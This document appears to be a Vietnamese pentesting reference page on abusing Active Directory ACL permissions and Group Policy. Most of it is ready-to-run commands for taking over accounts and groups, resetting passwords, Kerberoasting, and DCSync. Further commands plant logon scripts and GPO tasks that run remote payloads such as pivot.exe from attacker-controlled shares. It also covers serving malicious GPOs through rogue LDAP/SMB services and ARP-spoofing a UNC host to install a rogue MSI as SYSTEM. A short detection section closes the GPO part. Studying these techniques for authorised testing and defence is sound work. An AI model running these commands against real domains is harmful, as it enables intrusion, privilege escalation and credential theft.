# Lạm dụng ACL/ACE của Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Trang này chủ yếu tóm tắt các kỹ thuật từ** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **và** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Để biết thêm chi tiết, hãy xem các bài viết gốc.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Quyền GenericAll trên User**

Đặc quyền này cấp cho attacker toàn quyền kiểm soát tài khoản người dùng mục tiêu. Sau khi xác nhận quyền `GenericAll` bằng lệnh `Get-ObjectAcl`, attacker có thể:

- **Đổi mật khẩu của mục tiêu**: Dùng `net user <username> <password> /domain`, attacker có thể đặt lại mật khẩu của người dùng.
- Trên Linux, bạn có thể thực hiện tương tự thông qua SAMR bằng Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Nếu tài khoản bị vô hiệu hóa, hãy xóa cờ UAC**: `GenericAll` cho phép chỉnh sửa `userAccountControl`. Trên Linux, BloodyAD có thể xóa cờ `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Gán một SPN cho tài khoản người dùng để tài khoản này có thể bị kerberoast, sau đó dùng Rubeus và targetedKerberoast.py để trích xuất và thử crack các hash của ticket-granting ticket (TGT).

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Tắt pre-authentication cho người dùng, khiến tài khoản của họ dễ bị ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Với quyền `GenericAll` trên một người dùng, bạn có thể thêm thông tin xác thực dựa trên chứng chỉ và xác thực với tư cách họ mà không cần đổi mật khẩu. Xem:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Quyền GenericAll trên nhóm**

Đặc quyền này cho phép kẻ tấn công thao túng thành viên nhóm nếu họ có quyền `GenericAll` trên một nhóm như `Domain Admins`. Sau khi xác định tên phân biệt của nhóm bằng `Get-NetGroup`, kẻ tấn công có thể:

- **Thêm chính mình vào nhóm Domain Admins**: Có thể thực hiện việc này bằng các lệnh trực tiếp hoặc dùng các module như Active Directory hoặc PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Từ Linux, bạn cũng có thể tận dụng BloodyAD để tự thêm mình vào các group bất kỳ khi có quyền GenericAll/Write membership đối với chúng. Nếu group mục tiêu được lồng trong “Remote Management Users”, bạn sẽ ngay lập tức có quyền truy cập WinRM trên các host áp dụng group đó:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Có các đặc quyền này trên đối tượng máy tính hoặc tài khoản người dùng sẽ cho phép:

- **Kerberos Resource-based Constrained Delegation**: Cho phép chiếm quyền kiểm soát một đối tượng máy tính.
- **Shadow Credentials**: Dùng kỹ thuật này để mạo danh tài khoản máy tính hoặc người dùng bằng cách khai thác các đặc quyền để tạo shadow credentials.

## Di chuyển một đối tượng vào OU có quyền kế thừa

Một đường tấn công có thể kết hợp **quyền di chuyển một tài khoản** với **quyền ghi được kế thừa từ OU đích**, ngay cả khi ban đầu không principal nào có thể sửa các thuộc tính nhạy cảm của tài khoản. Hãy xác minh quyền di chuyển đối tượng nguồn và quyền `CreateChild` trên OU đích, di chuyển đối tượng, sau đó kiểm tra lại DACL hiệu lực của đối tượng. Ví dụ, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` của powerview.py sẽ di chuyển người dùng; sau đó, một nhóm được kiểm soát có `GenericWrite` kế thừa trên OU đó có thể thêm [shadow credential](shadow-credentials.md). Bản thân việc di chuyển không tạo ra quyền kế thừa.<sup>[[18]](#references)</sup>

Nếu bạn có `GenericAll` trên một OU nhưng không có ACE kế thừa phù hợp, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` có thể thêm ACE cho các đối tượng con của OU đó. Hãy kiểm tra riêng tài khoản mục tiêu: **các tài khoản được AdminSDHolder bảo vệ đã tắt tính năng kế thừa**, vì vậy ACE trên OU có thể ảnh hưởng đến người dùng thông thường nhưng không có tác dụng với người dùng được bảo vệ. Xem [AdminSDHolder và SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Một đường khai thác riêng có thể xảy ra khi script dọn dẹp theo lịch với đặc quyền cao chọn OU dựa trên các ACE do kẻ tấn công kiểm soát, sau đó chạy `Set-ADObject -Clear adminCount` **và** `$acl.SetAccessRuleProtection($False, $False)` trên các đối tượng con của OU đó. Nếu có thể sửa DACL của OU, hãy cấp cho nhóm được script kiểm tra ACE `ExtendedRight` hoặc `GenericAll` cần thiết; đồng thời, xác minh riêng rằng bạn có thể kích hoạt tác vụ. Tác vụ có đặc quyền cao sau đó có thể bật lại tính năng kế thừa trên một tài khoản vốn được bảo vệ, cho phép ACE trên OU có hiệu lực. Hãy xác nhận chính xác script, quyền kích hoạt và DACL sau khi thay đổi; chỉ xóa `adminCount` sẽ không bật lại tính năng kế thừa, và SDProp có thể tái bảo vệ các tài khoản vẫn thuộc nhóm được bảo vệ.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Nếu người dùng có quyền `WriteProperty` trên tất cả đối tượng của một nhóm cụ thể (ví dụ: `Domain Admins`), họ có thể:

- **Tự thêm mình vào nhóm Domain Admins**: Có thể thực hiện bằng cách kết hợp các lệnh `net user` và `Add-NetGroupUser`; phương pháp này cho phép leo thang đặc quyền trong domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) trên nhóm**

Quyền này cho phép kẻ tấn công tự thêm mình vào các nhóm cụ thể, chẳng hạn như `Domain Admins`, bằng các lệnh trực tiếp thao tác tư cách thành viên nhóm. Chuỗi lệnh sau cho phép tự thêm mình vào nhóm:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Một đặc quyền tương tự, cho phép kẻ tấn công trực tiếp tự thêm mình vào các group bằng cách sửa đổi thuộc tính của group nếu chúng có quyền `WriteProperty` trên các group đó. Xác nhận và thực thi đặc quyền này bằng cách:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Có quyền `ExtendedRight` trên một người dùng đối với `User-Force-Change-Password` cho phép đặt lại mật khẩu mà không cần biết mật khẩu hiện tại. Có thể xác minh quyền này và khai thác nó bằng PowerShell hoặc các công cụ dòng lệnh khác, với nhiều phương pháp đặt lại mật khẩu người dùng, bao gồm các phiên tương tác và lệnh một dòng dành cho môi trường phi tương tác. Các lệnh có phạm vi từ những lời gọi PowerShell đơn giản đến việc sử dụng `rpcclient` trên Linux, cho thấy sự đa dạng của các vector tấn công.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner trên Group**

Nếu kẻ tấn công phát hiện họ có quyền `WriteOwner` đối với một group, họ có thể thay đổi chủ sở hữu của group thành chính mình. Điều này đặc biệt có tác động lớn khi group đó là `Domain Admins`, vì việc thay đổi chủ sở hữu cho phép kiểm soát rộng hơn đối với các thuộc tính và thành viên của group. Quy trình này bao gồm xác định đúng đối tượng bằng `Get-ObjectAcl`, sau đó dùng `Set-DomainObjectOwner` để thay đổi chủ sở hữu bằng SID hoặc tên.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite trên User**

Quyền này cho phép kẻ tấn công sửa đổi các thuộc tính của user. Cụ thể, với quyền truy cập `GenericWrite`, kẻ tấn công có thể thay đổi đường dẫn logon script của user để thực thi một script độc hại khi user đăng nhập. Việc này được thực hiện bằng cách sử dụng lệnh `Set-ADObject` để cập nhật thuộc tính `scriptpath` của user mục tiêu, trỏ đến script của kẻ tấn công.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Một ACE `WriteProperty` có phạm vi hẹp hơn, chỉ áp dụng cho thuộc tính [`scriptPath` của người dùng](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), có thể là đủ; không cần `GenericWrite`. Kết hợp quyền ghi vào thuộc tính đó với một script có thể ghi trong cây `SYSVOL\<domain>\scripts` hoặc `NETLOGON` của domain, sau đó đánh giá khả năng người dùng mục tiêu đăng nhập và chạy đến script. Script chạy trong ngữ cảnh của người dùng đó khi đăng nhập. Kiểm tra riêng các ACL AD và ACL file/chia sẻ có hiệu lực; chỉ có một Allow ACE phù hợp hoặc một thư mục có thể ghi không đồng nghĩa với việc đã có đủ toàn bộ đường thực thi.

## **GenericWrite on Group**

Với đặc quyền này, attacker có thể thao túng thành viên nhóm, chẳng hạn như thêm chính họ hoặc người dùng khác vào các nhóm cụ thể. Quá trình này bao gồm việc tạo một credential object, sử dụng nó để thêm hoặc xóa người dùng khỏi nhóm, rồi xác minh các thay đổi về thành viên bằng các lệnh PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Từ Linux, Samba `net` có thể thêm/xóa thành viên khi bạn có quyền `GenericWrite` trên nhóm (hữu ích khi không có PowerShell/RSAT):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Việc sở hữu một đối tượng AD và có đặc quyền `WriteDACL` trên đối tượng đó cho phép attacker tự cấp cho mình đặc quyền `GenericAll` trên đối tượng. Điều này được thực hiện thông qua thao tác với ADSI, cho phép kiểm soát hoàn toàn đối tượng và khả năng sửa đổi tư cách thành viên nhóm của đối tượng. Tuy nhiên, vẫn có những hạn chế khi cố khai thác các đặc quyền này bằng các cmdlet `Set-Acl` / `Get-Acl` của module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Chiếm quyền nhanh bằng WriteDACL/WriteOwner (PowerView)

Khi có quyền `WriteOwner` và `WriteDacl` đối với một tài khoản người dùng hoặc tài khoản dịch vụ, bạn có thể toàn quyền kiểm soát tài khoản đó và đặt lại mật khẩu bằng PowerView mà không cần biết mật khẩu cũ:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Ghi chú:
- Bạn có thể cần đổi chủ sở hữu thành chính mình trước nếu bạn chỉ có quyền `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Xác thực quyền truy cập bằng bất kỳ giao thức nào (SMB/LDAP/RDP/WinRM) sau khi đặt lại mật khẩu.

## **Replication trên Domain (DCSync)**

Cuộc tấn công DCSync khai thác các quyền replication cụ thể trên domain để giả mạo Domain Controller và đồng bộ hóa dữ liệu, bao gồm thông tin xác thực của người dùng. Kỹ thuật mạnh mẽ này yêu cầu các quyền như `DS-Replication-Get-Changes`, cho phép kẻ tấn công trích xuất thông tin nhạy cảm từ môi trường AD mà không cần truy cập trực tiếp vào Domain Controller.<sup>[[5]](#references)</sup> [**Tìm hiểu thêm về cuộc tấn công DCSync tại đây.**](../dcsync.md)

## Ủy quyền GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ủy quyền GPO

Quyền truy cập được ủy quyền để quản lý Group Policy Objects (GPO) có thể gây ra rủi ro bảo mật đáng kể. Ví dụ, nếu một người dùng như `offense\spotless` được ủy quyền quyền quản lý GPO, họ có thể có các quyền như **WriteProperty**, **WriteDacl** và **WriteOwner**. Những quyền này có thể bị lạm dụng cho mục đích độc hại, như được xác định bằng PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Liệt kê quyền GPO

Có thể kết hợp các cmdlet của PowerSploit để xác định các GPO bị cấu hình sai. Cách này giúp tìm ra những GPO mà một người dùng cụ thể có quyền quản lý: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Máy tính áp dụng một chính sách cụ thể**: Có thể xác định những máy tính chịu ảnh hưởng của một GPO cụ thể, giúp hiểu rõ phạm vi tác động tiềm ẩn. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Các chính sách áp dụng cho một máy tính cụ thể**: Có thể sử dụng các lệnh như `Get-DomainGPO` để xem những chính sách được áp dụng cho một máy tính cụ thể.

**OU áp dụng một chính sách cụ thể**: Có thể xác định các organizational unit (OU) chịu ảnh hưởng của một chính sách bằng `Get-DomainOU`.

Bạn cũng có thể dùng công cụ [**GPOHound**](https://github.com/cogiceo/GPOHound) để liệt kê GPO và tìm các vấn đề trong đó.

### Lạm dụng GPO - New-GPOImmediateTask

Có thể khai thác các GPO bị cấu hình sai để thực thi code, chẳng hạn bằng cách tạo một scheduled task tức thời. Cách này có thể được dùng để thêm người dùng vào nhóm quản trị viên cục bộ trên các máy bị ảnh hưởng, qua đó nâng cao đáng kể quyền hạn:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Lạm dụng GPO

Nếu được cài đặt, module GroupPolicy cho phép tạo và liên kết GPO mới, cũng như thiết lập các tùy chọn như giá trị registry để thực thi backdoors trên các máy tính bị ảnh hưởng. Phương pháp này yêu cầu GPO được cập nhật và người dùng đăng nhập vào máy tính để thực thi:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Lạm dụng GPO

SharpGPOAbuse cung cấp một phương thức lạm dụng các GPO hiện có bằng cách thêm tác vụ hoặc sửa đổi cài đặt mà không cần tạo GPO mới. Công cụ này yêu cầu sửa đổi các GPO hiện có hoặc sử dụng công cụ RSAT để tạo GPO mới trước khi áp dụng các thay đổi:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Buộc cập nhật chính sách

GPO thường được cập nhật khoảng 90 phút một lần. Để đẩy nhanh quá trình này, đặc biệt là sau khi thực hiện thay đổi, có thể chạy lệnh `gpupdate /force` trên máy tính mục tiêu để buộc cập nhật chính sách ngay lập tức. Lệnh này đảm bảo mọi sửa đổi đối với GPO được áp dụng mà không cần chờ đến chu kỳ cập nhật tự động tiếp theo.

### Bên dưới lớp vỏ

Khi kiểm tra Scheduled Tasks của một GPO nhất định, chẳng hạn `Misconfigured Policy`, có thể xác nhận rằng các tác vụ như `evilTask` đã được thêm vào. Những tác vụ này được tạo bằng script hoặc công cụ dòng lệnh nhằm thay đổi hành vi hệ thống hoặc leo thang đặc quyền.

Cấu trúc của tác vụ, như thể hiện trong tệp cấu hình XML do `New-GPOImmediateTask` tạo ra, nêu chi tiết về tác vụ đã lên lịch, bao gồm lệnh sẽ thực thi và các trigger của tác vụ. Tệp này thể hiện cách các tác vụ đã lên lịch được định nghĩa và quản lý trong GPO, cung cấp phương thức thực thi lệnh hoặc script tùy ý trong quá trình áp dụng chính sách.

### Người dùng và Nhóm

GPO cũng cho phép thao túng tư cách thành viên người dùng và nhóm trên các hệ thống mục tiêu. Bằng cách chỉnh sửa trực tiếp các tệp chính sách Users and Groups, attacker có thể thêm người dùng vào các nhóm đặc quyền, chẳng hạn như nhóm `administrators` cục bộ. Điều này có thể thực hiện được thông qua việc ủy quyền quyền quản lý GPO, cho phép sửa đổi các tệp chính sách để thêm người dùng mới hoặc thay đổi tư cách thành viên nhóm.

Tệp cấu hình XML của Users and Groups mô tả cách triển khai những thay đổi này. Bằng cách thêm các mục vào tệp, có thể cấp đặc quyền nâng cao cho những người dùng cụ thể trên các hệ thống bị ảnh hưởng. Phương pháp này cung cấp một cách trực tiếp để leo thang đặc quyền thông qua thao túng GPO.

Đối với các thiết lập bảo mật như tư cách thành viên nhóm cục bộ và quyền người dùng, hãy kiểm tra thêm template GPO đã áp dụng tại `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` và ACL của thư mục `SecEdit`. Thư mục hoặc tệp có quyền ghi là dấu hiệu cần xem xét: quyền truy cập hiệu lực vào share SYSVOL, các ACL từ chối và kế thừa, quyền của Group Policy container, phạm vi áp dụng chính sách và quá trình làm mới trên client vẫn quyết định liệu thay đổi có hiệu lực hay không. Chỉ là thành viên của một nhóm có tên “GPO Managers” không đồng nghĩa với việc có quyền chỉnh sửa. [Microsoft mô tả đường dẫn template này và sự phân tách giữa Group Policy container và template.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Ngoài ra, cũng có thể cân nhắc các phương thức thực thi mã hoặc duy trì persistence khác, chẳng hạn như khai thác logon/logoff scripts, sửa đổi registry keys cho autoruns, cài đặt phần mềm qua các tệp .msi hoặc chỉnh sửa cấu hình service. Những kỹ thuật này cung cấp nhiều cách để duy trì quyền truy cập và kiểm soát các hệ thống mục tiêu thông qua việc lạm dụng GPO.

### Chuyển hướng việc truy xuất GPC/GPT đến các dịch vụ giả mạo có xác thực

Một GPO gồm **Group Policy Container (GPC)** trên LDAP chứa metadata và **Group Policy Template (GPT)** được lưu trữ trên SMB, chứa các tệp chính sách. Trong quá trình làm mới, client theo `gPLink` của container, đọc GPC được tham chiếu và `gPCFileSysPath` của nó, rồi tải GPT từ đường dẫn UNC đó. Do đó, quyền ghi vào chính GPC hoặc `gPLink` của một OU, Site hoặc Domain đều có thể bị khai thác để can thiệp vào quá trình xử lý chính sách với đặc quyền cao.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Đầu độc `gPCFileSysPath` bằng GPOddity

Nếu principal bị kiểm soát có thể ghi vào GPC mục tiêu (trực tiếp hoặc thông qua **NTLM relay to LDAP**), hãy thay `gPCFileSysPath` bằng đường dẫn UNC do attacker lưu trữ. [GPOddity](https://github.com/synacktiv/GPOddity) tự động hóa việc thay đổi LDAP và cung cấp một GPT độc hại chứa các tệp chính sách dựa trên module hoặc một Immediate Task mà Group Policy client thực thi với quyền `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Share SMB ẩn danh hoặc không phụ thuộc thông tin xác thực không đủ an toàn trên các client Windows hiện nay: SMB Secure Negotiate yêu cầu bằng chứng rằng xác thực đã thành công, vì vậy dịch vụ giả mạo phải xác thực danh tính domain, dẫn xuất session key của SMB và ký chính xác các phản hồi. Khi dùng chế độ nhúng, hãy cấu hình GPOddity bằng một machine account do bạn kiểm soát cùng service key của tài khoản đó, sau đó chọn payload phía computer hoặc user trong mục `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Trường hợp đặc biệt với User GPO:** sau MS16-072, Windows vẫn tạo hai phiên SMB2 trong **cùng một kết nối TCP**: phiên người dùng đọc `GPT.INI`, sau đó phiên tài khoản máy tính đọc cấu hình hiệu lực như `ScheduledTasks.xml`. Vì vậy, máy chủ giả mạo phải lập chỉ mục trạng thái xác thực, session key và signing key theo `SessionId` của SMB2, không chỉ theo socket. Bản fork Scapy được tích hợp trong GPOddity/OUned triển khai việc này thông qua `SMBStreamSocketMultiplexing` và `SMBServer` hỗ trợ multiplexing; nếu không, máy chủ Impacket/Scapy chỉ hỗ trợ một phiên sẽ dùng lại sai trạng thái ký và thất bại với các user policy.<sup>[[15]](#references)</sup>

#### Đầu độc `gPLink` bằng OUned

Với quyền `WriteGPLink`, `GenericWrite` hoặc quyền kiểm soát tương đương đối với OU, Site hoặc Domain, kẻ tấn công có thể thêm một liên kết trỏ đến GPC DN được cung cấp bởi máy chủ LDAP do kẻ tấn công kiểm soát. Kỹ thuật này ban đầu được Petros Koutroumpis giới thiệu; [OUned](https://github.com/synacktiv/OUned) tự động hóa thao tác ghi LDAP và chuỗi GPC/GPT độc hại.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Nạn nhân trước tiên xác thực với dịch vụ LDAP giả mạo và nhận một GPC có `gPCFileSysPath` trỏ đến dịch vụ SMB giả mạo; sau đó, nạn nhân xác thực với SMB và áp dụng GPT được cung cấp. Do đó, OUned cần một tài khoản có SPN LDAP, một tài khoản máy có SPN HOST cho SMB (cùng một tài khoản máy có thể đáp ứng cả hai yêu cầu), cùng với DNS phân giải hoặc chuyển tiếp ngược để chuyển các cổng 389 và 445 đến máy của người vận hành.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned tích hợp máy chủ LDAP Scapy xác thực Kerberos/SPNEGO bằng khóa dịch vụ thực tế do bạn kiểm soát và cung cấp dữ liệu GPC tùy ý từ JSON. Khóa JSON rỗng mô phỏng rootDSE, tiền tố `base64:` biểu thị các giá trị nhị phân, và máy chủ hỗ trợ các thao tác add/delete/modify/search cùng các kiểu tìm kiếm `BASE`, `LEVEL` và `SUBTREE`; máy chủ có thể thương lượng không dùng lớp bảo vệ, tính toàn vẹn hoặc tính bảo mật. Nhờ vậy, dịch vụ này có thể được tái sử dụng khi một thành phần Windows khác truy cập tham chiếu LDAP do kẻ tấn công kiểm soát nhưng yêu cầu LDAP đã xác thực.<sup>[[15]](#references)</sup>

Đừng cho rằng việc đồng bộ mật khẩu tài khoản vào một domain giả sẽ tái tạo mọi khóa Kerberos: RC4 được suy ra từ mật khẩu, trong khi AES string-to-key cũng dùng salt được suy ra từ hostname/domain của principal. Cung cấp khóa AES thực tế của tài khoản cho `KerberosSSP` giúp tránh phải ép dùng RC4 thông qua thay đổi dễ bị phát hiện đối với `msDS-SupportedEncryptionTypes` mà tài khoản máy có thể tự ghi.<sup>[[15]](#references)</sup>

#### Các điểm cần điều tra để phát hiện

Tương quan các thay đổi đối với `gPCFileSysPath` hoặc `gPLink` với thay đổi phiên bản GPO và XML Immediate/Scheduled Task mới. Điều tra các liên kết đến naming context bất thường, UNC host nằm ngoài danh sách DC/SYSVOL được phê duyệt, bản ghi DNS chuyển hướng tên tài khoản máy, service ticket LDAP/CIFS cho tài khoản máy bất thường và các thay đổi đối với `msDS-SupportedEncryptionTypes` bật RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` trên OU/domain cho phép bạn sửa thuộc tính `gPLink` của container mục tiêu và **buộc một GPO hiện có được áp dụng** mà không cần chỉnh sửa chính GPO đó. Điều này đáng chú ý khi GPO được liên kết đã tham chiếu nội dung từ xa qua **UNC path** (`\\HOST\share\...`), vì người dùng đã xác thực có thể đọc **SYSVOL** và tìm các policy có thể tái sử dụng khi phân tích ngoại tuyến.<sup>[[11]](#references)</sup>

Quy trình tổng quát:

1. Dùng BloodHound để xác định principal có `WriteGPLink` trên một OU và liệt kê máy tính/người dùng bên trong OU đó.
2. Sao chép `SYSVOL` ở chế độ chỉ đọc và phân tích GPO để tìm **Software Installation**, **ánh xạ ổ đĩa** (`Drives.xml`) và **script đăng nhập/khởi động** tham chiếu đến UNC path.
3. Ưu tiên các policy trỏ đến **hostname trực tiếp** (ví dụ `\\DC02\share\pkg.msi`) thay vì DFS/domain-namespace path, vì các path dùng hostname dễ bị chuyển hướng hơn bằng giả mạo L2.
4. Thêm GUID của GPO đã chọn vào `gPLink` của OU mục tiêu để máy nạn nhân xử lý policy hiện có đó.
5. Trên cùng broadcast domain, giả mạo ARP của UNC host và gán IP của nó cục bộ (`ip addr add <target_ip>/32 dev <iface>`) để lưu lượng SMB của máy nạn nhân đi đến host của bạn.
6. Cung cấp path/filename được mong đợi từ máy chủ SMB do kẻ tấn công kiểm soát (ví dụ `smbserver.py`) và chờ quá trình xử lý policy thông thường.

Ví dụ thu thập `SYSVOL` và đối chiếu GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Liên kết GPO hiện có với OU đích:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Nếu GPO được liên kết triển khai MSI từ đường dẫn UNC, client sẽ tải MSI trong lúc **khởi động máy tính** và cài đặt với quyền **`NT AUTHORITY\SYSTEM`**. Bằng cách giả mạo host được tham chiếu và cung cấp MSI độc hại tại **cùng share/path/name**, bạn có thể biến `WriteGPLink` thành thực thi mã với quyền SYSTEM **mà không cần chỉnh sửa SYSVOL**.

Các ràng buộc quan trọng:

- **Thời điểm rất quan trọng**: liên kết mới sẽ được áp dụng khi làm mới policy (thường khoảng 90 phút), nhưng **Software Installation** thường chỉ được kích hoạt khi **khởi động lại**.
- Windows Installer thường theo dõi bản triển khai bằng **`ProductCode`** của package. Nếu sản phẩm đã được cài đặt, quá trình triển khai có thể bị bỏ qua.
- Để tránh installer từ chối, hãy chỉnh sửa MSI giả mạo để **`ProductCode`** và **`PackageCode`** khớp với package hợp lệ mà GPO yêu cầu.
